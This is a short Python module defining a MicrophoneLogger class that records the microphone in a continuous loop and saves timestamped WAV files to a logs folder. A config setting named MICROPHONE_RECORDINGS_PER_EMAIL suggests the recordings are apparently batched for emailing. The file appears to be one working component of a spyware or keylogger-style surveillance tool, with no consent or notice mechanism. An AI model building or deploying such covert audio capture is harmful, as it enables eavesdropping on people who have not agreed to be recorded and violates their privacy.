import sounddevice
import scipy.io.wavfile as wavfile
import time
import os
import traceback

from config.config import (
    LOGS_DIRECTORY,
    MICROPHONE_RECORDING_INTERVAL,
    MICROPHONE_RECORDINGS_PER_EMAIL,
)
from core.utils.logging_utils import log_error, timestamp


class MicrophoneLogger:
    def __init__(self):
        self.log_directory = os.path.join(LOGS_DIRECTORY, "microphone/")
        self.interval = MICROPHONE_RECORDING_INTERVAL
        self.running = True

    def log_microphone(self):
        recording = sounddevice.rec(
            int(self.interval * 44100), samplerate=44100, channels=1, dtype="int16"
        )
        sounddevice.wait()
        wavfile.write(
            os.path.join(self.log_directory, f"{timestamp()}.wav"), 44100, recording
        )

    def run(self):
        try:
            while self.running:
                self.log_microphone()
                time.sleep(self.interval)
        except Exception as e:
            self.running = False
            log_error(e)
